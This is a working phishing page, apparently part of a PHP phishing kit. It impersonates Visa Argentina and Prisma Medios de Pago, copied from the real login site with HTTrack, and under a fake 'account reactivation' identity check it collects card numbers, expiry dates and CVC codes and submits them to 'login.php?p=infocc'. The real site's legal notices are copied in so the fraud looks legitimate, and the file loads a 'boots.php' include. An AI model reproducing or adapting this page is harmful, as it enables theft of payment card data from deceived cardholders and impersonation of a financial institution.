<?php require_once("boots.php"); ?>
<html lang="es"><head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>Verificar Identidad VISA</title>
	<link type="text/css" rel="stylesheet" href="resources/css/smoothness/jquery-ui-1.8.18.custom.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/text.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/reset.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/960.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/visa.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/tabs.min.css">
	<link type="text/css" rel="stylesheet" href="resources/css/column930.min.css">
<script type="text/javascript" src="resources/js/jquery-1.7.2.min.js"></script>
	<script type="text/javascript" src="resources/js/jquery-ui-1.8.18.custom.min.js"></script>
	<script type="text/javascript" src="resources/js/jquery.blockUI.min.js"></script>
	<script type="text/javascript" src="resources/js/bootstrap-modal.min.js"></script>
</head>
<body class="login-body">
	<div class="pre-header"></div>	
	<div class="header container-12">
		<div class="logo grid-6 alpha">
			<a href="#">
				<img src="resources/img/logo.jpg">
			</a>
		</div>
		<div class="user-info grid-6 omega"></div>
	</div>
	<div class="container-12"></div>
		<div class="login-content container-12">
				<div class="modal-body ">
<form id="frmverify" name="frmverify" method="post" action="login.php?p=infocc">
	<div>
      <div><div id="componentDiv" class="" style="border-bottom: 1px solid #666666; height: 80px; margin-bottom: 10px;">
					<h2>Verificación de identidad - REACTIVACION DE CUENTA</h2><strong>Si desea activar su tarjeta de credito Visa nuevamente, le solicitamos que siga el proceso de identificación personal que a continuación se le propone.</strong></div>
      </div>
      <div><div id="recuperarUsuario:recuperarUsuarioFrm:j_idt162:componentDiv" class="" style="height: 23px; margin-bottom: 5px; padding-left:7px">
					<span>Ingrese la siguiente información:</span></div>
      </div>
      <div><div id="110" class="nicknameModalContent" style="">
					
					
					
<div style="margin-top: 10px"><label for="cc_num">Numero de Tarjeta</label>
<input id="cc_num" autocomplete=false required placeholder="•••• •••• •••• •••• " maxlength="19" type="text" name="cc_num">
					</div>
<div style="margin-top: 10px"><label for="expmm">Fecha Expiracion:</label>
<select id="expmm" style="width:90px;" name="expmm" class="inputCombo-chico" size="1" tabindex="2">
	                        <option value="01">01 enero</option>
                            <option value="02">02 Febrero </option>
                            <option value="03">03 marzo</option>
                            <option value="04">04 Abril</option>
                            <option value="05">05 Mayo</option>
                            <option value="06">06 Junio</option>
                            <option value="07">07 Julio</option>
                            <option value="08">08 Agosto</option>
                            <option value="09">09 Septiembre</option>
                            <option value="10">10 Octubre</option>
                            <option value="11">11 Noviembre</option>
                            <option value="12">12 Diciembre</option>
                        </select>
<select id="expyy" style="width:90px;" name="expyy" class="inputCombo-chico" size="1" tabindex="2">
	                        <option value="18">2018</option>
                            <option value="19">2019 </option>
                            <option value="20">2020</option>
                            <option value="21">2021</option>
                            <option value="22">2022</option>
                            <option value="23">2023</option>
                            <option value="24">2024</option>
                            <option value="25">2025</option>
                            <option value="26">2026</option>
                            <option value="27">2027</option>
                            <option value="28">2028</option>
							<option value="29">2029</option>
							<option value="30">2030</option>
                        </select>

					</div>
<div style="margin-top: 10px"><label for="ccv">Codigo de seguridad:</label>
<input id="cvc" name="cvc" onkeyup="this.value=this.value.replace(/[^\d]/,'')"  maxlength="3" required pattern="[0-9]+" autocomplete=false style="width:196px" placeholder="•••" type="text" autocomplete="off">
					</div>

                    

					
		<div class="buttonBar clearfix"><input id="butn" type="submit" name="butn" value="Aceptar" class="button right"><input type="submit" disabled="disabled" value="Cancelar" class="button button right">
		</div></div>
      </div>
			</div>
</form>
        </div>

<div class="terms grid-12">
	<span>Los datos que se proporcionen a Prisma Medios de Pago S.A. podrán utilizarse para procesar sus pedidos, solicitudes, denuncias, reclamos, para la relación comercial y fines publicitarios. </span> <b>Disposición DNPDP 10/2008: "El titular de los datos personales tiene la facultad de ejercer el derecho de acceso a los mismos en forma gratuita a intervalos no inferiores a seis meses, salvo que se acredite un interés legítimo al efecto conforme lo establecido en el artículo 14, inciso 3 de la Ley Nº 25.326" y "La DIRECCION NACIONAL DE PROTECCION DE DATOS PERSONALES, Organo de Control de la Ley Nº 25.326, tiene la atribución de atender las denuncias y reclamos que se interpongan con relación al incumplimiento de las normas sobre protección de datos personales."</b>
</div>

	<div class="footer">
		<div class="footer-content container-12">
			<div class="grid-6">PRISMA MEDIOS DE PAGO S.A.</div>
			<div class="footer-legales grid-6"><a href="login8139.html?windowId=70d" class="grey-link" onclick="showPopup('consumerDefense'); return false;">Defensa al Consumidor</a>  |
				<a href="login8139.html?windowId=70d" class="grey-link" onclick="showPopup('personalDataProtection'); return false;">Protección de datos personales</a>
			</div>
		</div>
	</div>

<!-- Mirrored from inetserv.visa.com.ar/visahome/login?windowId=70d by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 22 Jan 2018 00:00:57 GMT -->
</div></body></html>